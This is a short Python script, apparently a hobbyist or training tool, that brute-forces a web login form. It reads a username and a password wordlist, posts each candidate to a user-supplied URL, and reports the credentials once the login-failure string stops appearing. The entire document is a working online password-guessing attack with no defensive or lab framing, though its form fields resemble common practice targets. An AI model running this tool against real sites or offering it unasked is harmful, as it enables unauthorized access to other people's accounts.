import pyfiglet
import requests
from termcolor import colored

welcome_banner=pyfiglet.figlet_format("Brute Forcing Login")
print(welcome_banner)

url=input("[+] Enter host: ")
username=input("[+] Enter username to brute force: ")
password_file=input("[+] Enter file containing passwords: ")
login_failed=input("[+] Enter string for failed login: ")

def brute(username,url):
    for password in passwords:
        password=password.strip()
        print(colored("Attempting login with "+password, "red"))
        creds={"username":username,"password":password,"Login":"submit"}
        response=requests.post(url, data=creds)
        if login_failed in response.content.decode():
            pass
        else:
            print(colored("[*] Found username: "+username, "green"))
            print(colored("[*] found password: "+password, "green"))
            exit()

with open(password_file, 'r') as passwords:
    brute(username,url)

print("Password not found")